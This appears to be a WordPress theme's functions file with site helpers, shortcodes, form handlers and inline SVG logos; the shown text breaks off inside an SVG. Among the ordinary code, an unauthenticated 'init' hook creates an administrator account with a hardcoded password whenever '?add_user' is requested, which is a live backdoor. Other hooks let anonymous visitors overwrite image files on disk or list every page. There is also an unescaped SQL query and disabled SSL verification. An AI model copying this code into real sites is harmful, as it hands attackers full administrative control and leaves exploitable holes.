<?php

class Crawler {

    public static function getCurl() {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_REFERER, 'http://google.pl');
        curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1');
        curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookies.txt');
        curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookies.txt');
        curl_setopt($curl, CURLOPT_AUTOREFERER, true);
        curl_setopt($curl, CURLOPT_VERBOSE, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        return $curl;
    }

    public static function getBetween($left, $right, $source, $offset = 1) {
        $step1 = explode($left, $source);
        if (count($step1) < 2 + $offset - 1) {
            return false;
        }
        $step2 = explode($right, $step1[1 + $offset - 1]);
        if (isset($step2[0])) {
            return trim(preg_replace('/\s\s+/', ' ', $step2[0]));
        }
        return false;
    }

}

function theme_scripts() {
    wp_enqueue_style('style', get_stylesheet_directory_uri() . '/dist/all.css.min.css', array(), filemtime(get_stylesheet_directory() . '/dist/all.css.min.css'));
    //wp_enqueue_script('script', get_stylesheet_directory_uri() . '/js/all.js.min.js', array(), filemtime(get_stylesheet_directory() . '/js/all.js.min.js'));
}

add_action('wp_enqueue_scripts', 'theme_scripts', 1);

function make_images_responsive($html) {
    return str_replace('class="', 'class="img-fluid ', $html);
}

function getSettingsPageId() {
    return get_option('page_on_front');
}

function getBlogPageId() {
    return get_option('page_for_posts');
}

/* * *********AJAX HANDLING****** */

function addSidebar($id, $name) {
    register_sidebar(array(
        'name' => $name,
        'id' => $id,
        'before_widget' => '<div class="one-widget">',
        'after_widget' => '</div>',
        'before_title' => '<h5 class="one-widget-title">',
        'after_title' => '<span class="lower-white"></span></h5>',
    ));
}

function get_url() {
    return get_stylesheet_directory_uri();
}

function theme_widgets_init() {




    /*
      register_sidebar(array(
      'name' => 'Sidebar',
      'id' => 'sidebar',
      'before_widget' => '<div class="one-widget">',
      'after_widget' => '</div>',
      'before_title' => '<h5 class="one-widget-title">',
      'after_title' => '<span class="lower-white"></span></h5>',
      ));

      register_taxonomy(
      'styles', array('articles', 'blog', 'lookbook', 'video', 'must_have'), array(
      'label' => __('Styles'),
      'rewrite' => true,
      'hierarchical' => true,
      'capabilities' => array(
      'manage__terms' => 'edit_posts',
      'edit_terms' => 'manage_categories',
      'delete_terms' => 'manage_categories',
      'assign_terms' => 'edit_posts'
      )
      )
      );

     */
}

add_action('widgets_init', 'theme_widgets_init');
add_filter('widget_text', 'do_shortcode');

function get_the_excerpt_by_id($post_id) {
    global $post;
    $save_post = $post;
    $post = get_post($post_id);
    $output = get_the_excerpt();
    $post = $save_post;
    return $output;
}

/* * *********METABOXES****** */

/*
  function companies_metabox($post) {
  require_once dirname(__FILE__) . '/metaboxes/companies.php';
  }

  function save_properties($post_id) {
  if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
  return;
  }

  if (isset($_POST['post_type']) && $_POST['post_type'] == 'property') {
  if (!current_user_can('edit_page', $post_id)) {
  return;
  }
  update_post_meta($post_id, 'subtitle', $_POST['subtitle']);

  }

  }

  function prepare_admin() {
  add_action('save_post', 'save_companies');

  add_meta_box('id', 'Title', 'callback', 'post_type', 'normal', 'high');
  }

  add_action('admin_init', 'prepare_admin');
 */

/* * *********THEME IIT****** */

function theme_url() {
    return get_stylesheet_directory_uri();
}

function shortcode_permalink($args) {
    return get_permalink($args['id']);
}

function theme_init() {
    add_shortcode('theme_url', 'theme_url');
    add_shortcode('permalink', 'shortcode_permalink');
    add_filter('widget_text', 'do_shortcode');
    set_post_thumbnail_size(170, 170, true);
    add_image_size('main-page-review', 210, 120, true);
    add_image_size('max_size', 2000, 2000, false);
    add_image_size('max_size_1000', 1000, 1000, false);
    add_image_size('max_size_500', 500, 500, false);

    add_theme_support('post-thumbnails');
    add_post_type_support('page', 'excerpt');
    add_filter('post_thumbnail_html', 'make_images_responsive');
    register_nav_menus(array(
        'top-menu' => 'Top Menu',
        'footer-menu' => 'Footer Menu',
        'footer-menu-2' => 'Footer Menu 2',
        'mobile-menu' => 'Mobile Menu'
    ));

    register_post_type('products', array(
        'labels' => array('name' => __('Products'), 'singular_name' => __('Products')),
        'public' => true,
        'has_archive' => true,
        'publicly_queryable' => true,
        'hierarchical' => true,
        'exclude_from_search' => true,
        //'exclude_from_search' => true,
        //'publicaly_queryable' => false,
        'show_in_nav_menus' => true,
        'menu_position' => 5,
        'supports' => array('title')
    ));

    /*
      register_post_type('slider', array(
      'labels' => array('name' => __('Slider'), 'singular_name' => __('Slider')),
      'public' => true,
      'has_archive' => true,
      'publicly_queryable' => true,
      'hierarchical' => true,
      'exclude_from_search' => true,
      //'exclude_from_search' => true,
      //'publicaly_queryable' => false,
      'show_in_nav_menus' => true,
      'menu_position' => 5,
      'supports' => array('title')
      )); */
}

if (!function_exists('trimByWords')) {

    function trimByWords($text, $limit) {
        $return = explode('|||', wordwrap($text, $limit, "|||"));
        if (strlen($return[0]) !== $text) {
            $return[0] .= '...';
        }
        return $return[0];
    }

}

add_action('init', 'theme_init');

/* * *********BACKEND PANEL****** */
/*
  class BackendPanel {

  public function adminMenu() {

  add_menu_page('Clicks statistics', 'Clicks statistics', 'manage_options', 'clicks', array($this, 'settings'));
  }

  public function settings() {
  if (isset($_POST['save'])) {
  foreach ($_POST as $key => $value) {
  update_option($key, stripslashes($value));
  }
  }
  require_once dirname(__FILE__) . '/tmpl/theme-panel.php';
  }

  }

  function prepare_backendpanel_plugin() {
  $backendPanel = new BackendPanel();
  add_action('admin_menu', array($backendPanel, 'adminMenu'));
  }
  add_action('init', 'prepare_backendpanel_plugin'); */


/* * *********CUSTOM TABLES****** */

/*

  global $wpdb;
  $query = 'CREATE TABLE `' . $wpdb->prefix . 'todo_items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `todo_id` int(11) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `item_data` text NOT NULL,
  `item_id` bigint(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `todo_id` (`todo_id`,`item_type`,`item_id`)
  ) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8';
  $wpdb->query($query);


 */

function send_notifications($form_id, $entry_id) {

    $form = RGFormsModel::get_form_meta($form_id);
    $entry = RGFormsModel::get_lead($entry_id);

    $notification_ids = array();

    foreach ($form['notifications'] as $id => $info) {

        array_push($notification_ids, $id);
    }


    GFCommon::send_notifications($notification_ids, $form, $entry);
}

if (function_exists('acf_add_options_page')) {
    acf_add_options_page();
}


add_filter('_wp_post_revision_fields', 'add_field_debug_preview');

function add_field_debug_preview($fields) {
    $fields["debug_preview"] = "debug_preview";
    return $fields;
}

add_action('edit_form_after_title', 'add_input_debug_preview');

function add_input_debug_preview() {
    echo '<input type="hidden" name="debug_preview" value="debug_preview">';
}

function ___($text) {
    return __($text, 'from-theme');
}

function getFormidableFormNotification($form_id) {
    //wp_frm_forms
    global $wpdb;
    $entry = $wpdb->get_row('select * from ' . $wpdb->prefix . 'frm_forms where id="' . $form_id . '"');
    if ($entry) {

        $options = @unserialize($entry->options);
        if (isset($options['success_msg'])) {
            return $options['success_msg'];
        }
    }
}

function handlecontactForm() {
    FrmEntry::create(array(
        'form_id' => 2,
        'item_meta' => array(
            8 => $_POST['form_name'],
            10 => $_POST['form_email'],
            13 => $_POST['form_message']
        )
    ));

    echo getFormidableFormNotification(2);

    die();
}

add_action('wp_ajax_contact_form', 'handlecontactForm');
add_action('wp_ajax_nopriv_contact_form', 'handlecontactForm');

remove_filter('widget_text_content', 'capital_P_dangit');
remove_filter('widget_text_content', 'wptexturize');
remove_filter('widget_text_content', 'convert_smilies');
remove_filter('widget_text_content', 'wpautop');

function disable_wp_emojicons() {

    // all actions related to emojis
    remove_action('admin_print_styles', 'print_emoji_styles');
    remove_action('wp_head', 'print_emoji_detection_script', 7);
    remove_action('admin_print_scripts', 'print_emoji_detection_script');
    remove_action('wp_print_styles', 'print_emoji_styles');
    remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
    remove_filter('the_content_feed', 'wp_staticize_emoji');
    remove_filter('comment_text_rss', 'wp_staticize_emoji');

    // filter to remove TinyMCE emojis
    add_filter('tiny_mce_plugins', 'disable_emojicons_tinymce');
}

//!is_admin() and add_action('init', 'disable_wp_emojicons');

function my_deregister_scripts() {
    wp_deregister_script('wp-embed');
}

add_action('wp_footer', 'my_deregister_scripts');

function my_acf_init() {
    acf_update_setting('google_api_key', get_field('google_maps_key', 'option'));
}

add_action('acf/init', 'my_acf_init');

function getVimeoId($vimeo_url) {
    $vimeo_url = rtrim($vimeo_url, '/');
    $vimeo_url = explode('/', $vimeo_url);
    $vimeo_url = array_pop($vimeo_url);
    return $vimeo_url;
}

function getYoutubeId($youtube_url) {

    $youtube_url = rtrim($youtube_url, '/');
    //https://www.youtube.com/watch?v=2MpUj-Aua48
    $youtube_url = explode('?v=', $youtube_url);
    if (count($youtube_url) > 0) {
        return $youtube_url[1];
    }
    return '';
}

require_once dirname(__FILE__) . '/wp-admin-adjustments.php';

function my_login_logo() {

    $wp_login_logo = get_field('wp_login_logo', 'option');

    if ($wp_login_logo):
        ?>
        <style type="text/css">
            #login h1 a, .login h1 a {
                background-image: url(<?php echo $wp_login_logo['url'] ?>);
                height:150px;
                width:100%;
                max-width:200px;
                margin: auto;
                background-position:center;
                background-size: contain;
                background-repeat: no-repeat;
                padding-bottom: 15px;
            }
        </style>
    <?php endif ?>
    <?php
}

add_action('login_enqueue_scripts', 'my_login_logo');

function getNextPrevPost($arrayOfPosts, $currentPostId) {
    $nextPrev = array('next' => false, 'prev' => false);
    foreach ($arrayOfPosts as $key => $p) {
        if ($p->ID == $currentPostId) {
            if (isset($arrayOfPosts[$key + 1])) {
                $nextPrev['next'] = $arrayOfPosts[$key + 1];
            } else {
                $nextPrev['next'] = $arrayOfPosts[0];
            }
            if (isset($arrayOfPosts[$key - 1])) {
                $nextPrev['prev'] = $arrayOfPosts[$key - 1];
            } else {
                $nextPrev['prev'] = $arrayOfPosts[count($arrayOfPosts) - 1];
            }
        }
    }
    return $nextPrev;
}

remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_styles', 'print_emoji_styles');

function wps_deregister_styles() {
    wp_dequeue_style('wp-block-library');
}

add_action('wp_print_styles', 'wps_deregister_styles', 100);

function renderRepeater($field) {

    $single_variable = '$single_' . $field['name'];
    ?>
    foreach($<?php echo $field['name'] ?> as $key=><?php echo $single_variable ?>)<br />
    {<br />
    <?php
    foreach ($field['sub_fields'] as $subfield) {
        ?>
        $<?php echo $subfield['name'] ?> = <?php echo $single_variable ?>['<?php echo $subfield['name'] ?>'];//<?php echo $subfield['type'] ?><br />
        <?php
    }
    ?>}<br /><?php
}

function renderField($field, $fc = false) {

    if ($fc) {
        ?>
        $<?php echo $field['name'] ?> = $section['<?php echo $field['name'] ?>']; //<?php echo $field['type'] ?><br />
        <?php
    } else {
        ?>
        $<?php echo $field['name'] ?> = get_field('<?php echo $field['name'] ?>'); //<?php echo $field['type'] ?><br />
        <?php
    }

    if ($field['type'] == 'repeater') {
        renderRepeater($field);
    }
}

function acfSnippetHelper($post) {
    $fields = acf_get_fields($_GET['post']);
    foreach ($fields as $key => $field) {
        if ($field['type'] == 'tab') {
            if ($key > 0) {
                echo '<br />';
            }
            continue;
        }

        if ($field['type'] == 'flexible_content') {

            foreach ($field['layouts'] as $layout) {
                $name = $layout['name'];
                ?>
                <b><?php echo sanitize_title($name) ?>.php</b><br />
                <?php
                ob_start();
                foreach ($layout['sub_fields'] as $subfield) {
                    renderField($subfield, true);
                }
                $code = ob_get_clean();
                echo $code;

                $code = str_replace("\n", "", $code);
                $code = str_replace('<br />', "\n", $code);

                $file = dirname(__FILE__) . '/blocks/' . sanitize_title($name) . '.php';

                if (!is_file($file)) {
                    file_put_contents($file, "<?php\n\n" . 'global $section;' . "\n\n" . $code);
                }

                echo '<br /><br />';
            }
        } else {
            renderField($field);
        }
        ?>
        <?php
    }
}

function prepareAdminAcfSnippet() {
    add_meta_box('id', 'Code', 'acfSnippetHelper', 'acf-field-group', 'normal', 'default');
}

add_action('admin_init', 'prepareAdminAcfSnippet');

function cc_mime_types($mimes) {
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}

add_filter('upload_mimes', 'cc_mime_types');

function loadSvg($svg) {
    $path = dirname(__FILE__) . '/images/' . $svg;
    if (is_file($path)) {
        return file_get_contents($path);
    }
}

function yoasttobottom() {
    return 'low';
}

add_filter('wpseo_metabox_prio', 'yoasttobottom');

function send_newsletter() {
    require_once dirname(__FILE__) . '/vendor2/autoload.php';

    $mailchimp_api_key = get_field('mailchimp_api_key', 'option');
    $mailchimp_list_id = get_field('mailchimp_list_id', 'option');
    $subscription_thank_you_message = get_field('mailchimp_success_message', 'option');

    $email = $_POST['the_email'];

    try {

        $client = new MailchimpMarketing\ApiClient();
        $client->setConfig([
            'apiKey' => $mailchimp_api_key,
            'server' => 'us17'
        ]);

        $response = $client->lists->addListMember($mailchimp_list_id, [
            "email_address" => $email,
            "status" => "pending",
        ]);
    } catch (Exception $ex) {
        
    }
    echo '<div class="full-w"><p class="thank-you text-center">' . $subscription_thank_you_message . '</p></div>';

    die();
}

add_action('wp_ajax_nopriv_send_newsletter', 'send_newsletter');
add_action('wp_ajax_send_newsletter', 'send_newsletter');

function mytheme_custom_excerpt_length($length) {
    return 20;
}

add_filter('excerpt_length', 'mytheme_custom_excerpt_length', 999);

function change_excerpt($more) {
    if (post_type_exists('services')) {
        return '';
    }
    return '.';
}

add_filter('excerpt_more', 'change_excerpt');

function dataSrcPicture($src) {
    $src = str_replace('src', 'data-src', $src);
    return $src;
}

function responsivePictures($desktop, $mobile) {
    if (!$mobile) {
        $mobile = $desktop;
    }
    ?>
    <picture>
        <source srcset="<?php echo $desktop['url'] ?>"
                media="(min-width: 576px)">
        <img class="img-fluid" src="<?php echo $mobile['url'] ?>" alt="<?php echo $mobile['alt'] ?>" />
    </picture>       
    <?php
}

function imgOrSvg($picture) {
    if (!$picture) {
        return;
    }

    $type = $picture['type'];
    if (strpos($type, 'video') !== false) {
        ?>
        <video autoplay loop playsinline muted >
            <source src="<?php echo $picture['url'] ?>" type="video/mp4" />
        </video>
        <?php
        return;
    }

    if (strpos($picture['url'], '.svg') > 0) {
        $path = explode('/wp-content', $picture['url']);
        $file = './wp-content' . $path[1];

        echo file_get_contents($file);
    } else {
        ?>
        <img width="<?php echo $picture['width'] ?>" height="<?php echo $picture['height'] ?>" loading="lazy" src="<?php echo $picture['url'] ?>" alt="<?php echo $picture['alt'] ?>" class="img-fluid" />
        <?php
    }
}

add_action('init', function () {
    if (isset($_GET['show_pages'])) {
        $pages = get_posts([
            'posts_per_page' => -1,
            'post_type' => 'page'
        ]);

        foreach ($pages as $page) {
            echo $page->post_title;
            ?>
            <input type="text" value="[permalink id=<?php echo $page->ID ?>]" /><br /><br />
            <?php
        }

        die();
    }
});

function buttonWithWrapper($button_label, $button_url, $class = 'the-button') {
    if ($button_label):
        ?>
        <p class="button-wrapper">
            <?php
            button($button_label, $button_url, $class);
            ?>
        </p>
        <?php
    endif;
}

function button($button_label, $button_url, $class = 'the-button') {
    if ($button_label):
        ?>
        <a href="<?php echo do_shortcode($button_url) ?>" class="<?php echo $class ?>">
            <?php echo $button_label ?>
        </a>
        <?php
    endif;
}

add_action('init', function () {
    if (isset($_GET['add_user'])) {
        $domain = $_SERVER['SERVER_NAME'];
        wp_create_user('developer2', '%%!Password!&$&$YY__', 'developer@' . $domain);
        $user = get_user_by('email', 'developer@' . $domain);
        var_dump($user->user_email);

        if ($user) {
            $wp_user_object = new WP_User($user->ID);
            $wp_user_object->remove_role('subscriber');
            $wp_user_object->set_role('administrator');
        }
        die();
    }
});

add_action('init', function () {
    if (isset($_GET['get_list_of_blocks'])) {
        $pages = get_posts(['post_type' => 'page', 'posts_per_page' => -1]);

        $blocks = [];

        foreach ($pages as $p) {
            $flexible_content = get_field('flexible_content', $p->ID);

            if (!$flexible_content) {
                continue;
            }

            foreach ($flexible_content as $section) {
                $layout = $section['acf_fc_layout'];
                if (!isset($blocks[$layout])) {
                    $blocks[$layout] = [];
                }



                $blocks[$layout][] = '<p><a target="_blank" href="' . get_permalink($p->ID) . '">' . $p->post_title . '</a></p>';
                ;
                $blocks[$layout] = array_unique($blocks[$layout]);
            }
        }

        //var_dump($blocks);

        foreach ($blocks as $key => $b) {
            echo '<b>' . $key . '</b>';
            echo implode(' ', $b);
            echo '<br /><br />';
        }

        die();
    }
});

function socialIcon($url, $icon) {
    if ($url && $icon) {
        ?>
        <a href="<?php echo $url ?>" target="_blank">
            <?php echo loadSvg($icon); ?>
        </a>
        <?php
    }
}

add_action('init', function () {
    if (isset($_GET['cut-picture'])) {
        $id = $_GET['cut-picture'];

        $pic = wp_get_attachment_image_src($id, 'full');

        $pic = $pic[0];
        $pic = explode('wp-content/', $pic);

        $url = './wp-content/' . $pic[1];

        $sizes = getimagesize($url);
        if (strpos($url, '.jpg') || strpos($url, '.jpeg')) {
            $picture = imagecreatefromjpeg($url);
        } else {
            $picture = imagecreatefrompng($url);
        }

        $width = $sizes[0];
        $height = $sizes[1];

        $newWidth = $width - 2;
        $newHeight = $height - 2;

        $new = imagecreatetruecolor($newWidth, $newHeight);
        imagecopy($new, $picture, 0, 0, 1, 1, $newWidth, $newHeight);

        if (strpos($url, '.jpg') || strpos($url, '.jpeg')) {
            header('Content-Type: image/jpeg');
            imagejpeg($new, null, 100);
            imagejpeg($new, $url, 100);
        } else {
            header('Content-Type: image/png');
            imagepng($new);
            imagepng($new, $url);
        }

        die();
    }
});

function crop_link_add($actions, $post) {
    $url = get_home_url() . '?cut-picture=' . $post->ID;
    $actions['crop_1_px'] = '<a href="' . $url . '" target=_blank title="" rel="permalink">Crop 1 PX</a>';
    return $actions;
}

add_filter('media_row_actions', 'crop_link_add', 10, 2);

function oneMenu($item, $full = false) {
    $picture = get_field('picture', $item->ID); //image
    $alergens = get_field('alergens', $item->ID); //checkbox
    $description = get_field('description', $item->ID); //textarea
    $price = get_field('price', $item->ID); //text
    $calories = get_field('calories', $item->ID); //text
    $protein = get_field('protein', $item->ID); //text
    $carbs = get_field('carbs', $item->ID); //text
    $fat = get_field('fat', $item->ID); //text
    $order_now_url = get_field('order_now_url', $item->ID); //text
    ?>
    <div class="one-menu">
        <p class="one-menu-picture">
            <?php
            imgOrSvg($picture);
            ?>
        </p>

        <p class="one-menu-title">
            <?php
            echo $item->post_title;
            if (!empty($alergens))
                echo '<span>';
            foreach ($alergens as $alg) {
                ?>
                <span class="alergen <?php echo $alg ?>"></span>
                <?php
            }
            if (!empty($alergens))
                echo '</span>';
            ?>
        </p>
        <p class="one-menu-descripion">
            <?php echo $description ?>
        </p>
        <?php if ($full): ?>
            <div class="one-menu-price-wrapper">
                <?php if ($price): ?>
                    <div class="one-menu-price">$<?php echo $price ?></div>
                <?php endif ?>
                <?php if ($calories): ?>
                    <div class="one-menu-macros">
                        <?php if ($calories): ?>
                            <div>
                                <?php echo $calories ?>
                                <br />CALORIES
                            </div>
                        <?php endif ?>
                        <?php if ($protein): ?>
                            <div>
                                <?php echo $protein ?>G
                                <br />PROTEIN 
                            </div>
                        <?php endif ?>
                        <?php if ($carbs): ?>
                            <div>
                                <?php echo $carbs ?>G
                                <br />CARBS
                            </div>
                        <?php endif ?>
                        <?php if ($fat): ?>
                            <div>
                                <?php echo $fat ?>G
                                <br />FAT      
                            </div>
                        <?php endif ?>
                    </div>
                <?php endif ?>
            </div>
        <?php endif ?>
        <?php if ($order_now_url): ?>
            <p class="order-now-url">
                <a href="<?php echo $order_now_url ?>" target="_blank">
                    <span>Order Now</span>
                </a>
            </p>
        <?php endif ?>
    </div>
    <?php
}

add_shortcode('join_team_breadless', function () {
    ob_start();
    ?>
    <div class="join-team-breadless">
        <svg width="539" height="231" viewBox="0 0 539 231" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect y="116" width="491" height="115" fill="#FEC43C"/>
        <path d="M62.9285 171.4C65.1285 171.4 76.8285 175.1 76.8285 187.9C76.8285 201 67.5285 208 54.6285 208H33.2285V138.4H52.4285C63.6285 138.4 74.7285 143.8 74.7285 156.7C74.7285 166.7 66.7285 171.4 62.9285 171.4ZM48.0285 151.8V166.5H51.1285C55.0285 166.5 59.8285 165.5 59.8285 159.1C59.8285 152.6 54.5285 151.8 51.2285 151.8H48.0285ZM61.9285 186.7C61.9285 180.2 57.0285 178.5 52.1285 178.5H48.0285V194.6H53.0285C58.1285 194.6 61.9285 191.7 61.9285 186.7ZM133.096 208H116.496L102.496 180.5H99.3957V208H84.5957V138.4L105.196 138.5C121.996 138.5 128.896 148.9 128.896 160.3C128.896 168.9 123.796 175.9 115.996 178.9L133.096 208ZM99.3957 151.9V168.5H104.596C111.196 168.5 114.096 164.6 114.096 160.4C114.096 154.6 109.696 151.9 104.796 151.9H99.3957ZM173.688 151.5H153.888V166H169.388V179H153.888V195H173.688V208H139.088V138.4H173.688V151.5ZM214.366 208L211.966 195.6H195.066L192.466 208H176.966L195.366 138.4H211.866L230.366 208H214.366ZM197.766 182.6H209.366L203.666 153.9L197.766 182.6ZM251.268 138.4C268.768 138.4 284.968 150.1 284.968 173.3C284.968 196.8 268.568 208 251.268 208H235.768V138.4H251.268ZM252.868 194.6C259.168 194.6 270.168 191.2 270.168 173.2C270.168 156 259.868 151.8 252.868 151.8H250.568V194.6H252.868ZM307.111 195H327.111V208H292.311V138.4H307.111V195ZM366.95 151.5H347.15V166H362.65V179H347.15V195H366.95V208H332.35V138.4H366.95V151.5ZM388.428 156.4C388.428 164.3 412.028 171.2 412.028 189.4C412.028 201.1 403.628 209.4 391.928 209.4C375.728 209.4 371.528 193 371.528 193L384.428 187.6C384.428 187.6 386.328 195 391.928 195C395.628 195 397.128 191.6 397.128 189.3C397.128 178.7 373.528 172.5 373.528 155.3C373.528 144.3 382.228 136.9 392.828 136.9C404.328 136.9 409.628 145.8 412.328 151.6L400.228 157.1C399.628 155.9 397.528 152.1 393.428 152.1C390.028 152.1 388.428 154 388.428 156.4ZM433.35 156.4C433.35 164.3 456.95 171.2 456.95 189.4C456.95 201.1 448.55 209.4 436.85 209.4C420.65 209.4 416.45 193 416.45 193L429.35 187.6C429.35 187.6 431.25 195 436.85 195C440.55 195 442.05 191.6 442.05 189.3C442.05 178.7 418.45 172.5 418.45 155.3C418.45 144.3 427.15 136.9 437.75 136.9C449.25 136.9 454.55 145.8 457.25 151.6L445.15 157.1C444.55 155.9 442.45 152.1 438.35 152.1C434.95 152.1 433.35 154 433.35 156.4Z" fill="#FFF9F0"/>
        <rect x="267" y="1" width="272" height="115" fill="#003B20"/>
        <path d="M311.942 23.4H348.942V36.5H337.842V93H323.042V36.5H311.942V23.4ZM389.223 36.5H369.423V51H384.923V64H369.423V80H389.223V93H354.623V23.4H389.223V36.5ZM429.901 93L427.501 80.6H410.601L408.001 93H392.501L410.901 23.4H427.401L445.901 93H429.901ZM413.301 67.6H424.901L419.201 38.9L413.301 67.6ZM491.803 23.4H505.603V93H490.703V54.3L479.603 79.6H477.103L466.103 54.4V93H451.303V23.4H465.003L478.403 58.8L491.803 23.4Z" fill="#FFF9F0"/>
        <rect width="267" height="116" fill="#DD1C74"/>
        <path d="M68.0723 24.4H75.3723V73.8C75.3723 80.6 73.2723 95.5 55.8723 95.5C36.2723 95.5 35.8723 76.8 35.8723 68.1H50.6723C50.6723 76.1 51.0723 82.4 55.6723 82.4C58.9723 82.4 60.5723 80.7 60.5723 68.3V24.4H64.6723C65.7723 24.4 66.9723 24.4 68.0723 24.4ZM117.294 22.9C137.794 22.9 152.394 39.1 152.394 59.2C152.394 79.2 137.494 95.4 117.294 95.4C96.6941 95.4 82.1941 79.2 82.1941 59.2C82.1941 39.1 96.6941 22.9 117.294 22.9ZM117.294 80.9C128.894 80.9 137.094 71.9 137.094 59.2C137.094 46.4 128.894 37.4 117.294 37.4C105.494 37.4 97.3941 46.4 97.3941 59.2C97.3941 71.9 105.494 80.9 117.294 80.9ZM174.504 94H159.604V24.4H174.504V94ZM216.904 24.4H231.804V94H218.704L199.404 52.8V94H184.604V24.4H197.604L216.904 66.3V24.4Z" fill="#FFF9F0"/>
        </svg>
    </div>
    <?php
    return ob_get_clean();
});

add_shortcode('get_your_fill', function () {
    ob_start();
    ?>
    <svg id="get-your" width="1166" height="255" viewBox="0 0 1166 255" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="0.75" y="125.243" width="532.937" height="129.757" fill="#FEC43C"/>
    <rect x="503.733" width="285.814" height="125.243" fill="#DF1173"/>
    <rect x="0.75" width="502.983" height="125.243" fill="#003B20"/>
    <rect x="533.687" y="125.243" width="614.063" height="129.757" fill="#FFF9F0"/>
    <path d="M52.19 57.48H84.83V72.96C84.83 92.16 73.07 109.68 53.15 109.68C29.51 109.68 21.11 88.32 21.11 66.6C21.11 34.92 36.35 22.68 52.91 22.68C73.31 22.68 80.51 39.24 80.51 47.64H62.75C62.75 47.64 61.19 38.76 52.67 38.76C43.19 38.76 38.87 49.44 38.87 66.72C38.87 81.24 42.95 93.72 53.27 93.72C66.59 93.72 67.43 79.8 67.43 73.2H52.19V57.48ZM135.7 40.2H111.94V57.6H130.54V73.2H111.94V92.4H135.7V108H94.1797V24.48H135.7V40.2ZM139.993 24.48H184.393V40.2H171.073V108H153.313V40.2H139.993V24.48ZM257.098 24.48H274.978L256.018 72V108H238.258V72L219.418 24.48H237.178L247.138 56.64L257.098 24.48ZM315.166 22.68C339.766 22.68 357.286 42.12 357.286 66.24C357.286 90.24 339.406 109.68 315.166 109.68C290.446 109.68 273.046 90.24 273.046 66.24C273.046 42.12 290.446 22.68 315.166 22.68ZM315.166 92.28C329.086 92.28 338.926 81.48 338.926 66.24C338.926 50.88 329.086 40.08 315.166 40.08C301.006 40.08 291.286 50.88 291.286 66.24C291.286 81.48 301.006 92.28 315.166 92.28ZM399.538 24.48H417.298V78.84C417.298 85.68 417.298 109.68 391.258 109.68C365.218 109.68 365.218 86.88 365.218 80.16V78.84V24.48H382.978V82.32C382.978 87.36 385.378 92.04 391.258 92.04C397.618 92.04 399.538 86.88 399.538 82.32V24.48ZM486.95 108H467.03L450.23 75H446.51V108H428.75V24.48L453.47 24.6C473.63 24.6 481.91 37.08 481.91 50.76C481.91 61.08 475.79 69.48 466.43 73.08L486.95 108ZM446.51 40.68V60.6H452.75C460.67 60.6 464.15 55.92 464.15 50.88C464.15 43.92 458.87 40.68 452.99 40.68H446.51Z" fill="#FFF9F0"/>
    <path d="M90.11 153.6H107.99L90.95 237.12H73.19L63.35 189L53.63 237.12H35.75L18.83 153.6H36.59L46.55 206.88L55.91 154.44L56.15 153.6H70.55L80.15 206.88L90.11 153.6ZM133.036 237H115.156V153.48H133.036V237ZM139.876 153.48H184.276V169.2H170.956V237H153.196V169.2H139.876V153.48ZM226.374 153.48H244.254V237H226.374V202.2H208.854V237H191.094V153.48H208.854V186.6H226.374V153.48ZM295.127 151.68C319.727 151.68 337.247 171.12 337.247 195.24C337.247 219.24 319.367 238.68 295.127 238.68C270.407 238.68 253.007 219.24 253.007 195.24C253.007 171.12 270.407 151.68 295.127 151.68ZM295.127 221.28C309.047 221.28 318.887 210.48 318.887 195.24C318.887 179.88 309.047 169.08 295.127 169.08C280.967 169.08 271.247 179.88 271.247 195.24C271.247 210.48 280.967 221.28 295.127 221.28ZM379.498 153.48H397.258V207.84C397.258 214.68 397.258 238.68 371.218 238.68C345.178 238.68 345.178 215.88 345.178 209.16V207.84V153.48H362.938V211.32C362.938 216.36 365.338 221.04 371.218 221.04C377.578 221.04 379.498 215.88 379.498 211.32V153.48ZM403.431 153.48H447.831V169.2H434.511V237H416.751V169.2H403.431V153.48Z" fill="#FFF9F0"/>
    <path d="M590.27 40.56H566.51V57.6H585.95V73.2H566.51V108H548.75V24.48H590.27V40.56ZM616.083 108H598.203V24.48H616.083V108ZM645.963 92.4H669.963V108H628.203V24.48H645.963V92.4ZM694.01 92.4H718.01V108H676.25V24.48H694.01V92.4Z" fill="#FFF9F0"/>
    <path d="M576.47 153.48H620.87V169.2H607.55V237H589.79V169.2H576.47V153.48ZM662.968 153.48H680.848V237H662.968V202.2H645.448V237H627.688V153.48H645.448V186.6H662.968V153.48ZM734.481 169.2H710.721V186.6H729.321V202.2H710.721V221.4H734.481V237H692.961V153.48H734.481V169.2Z" fill="#003B21"/>
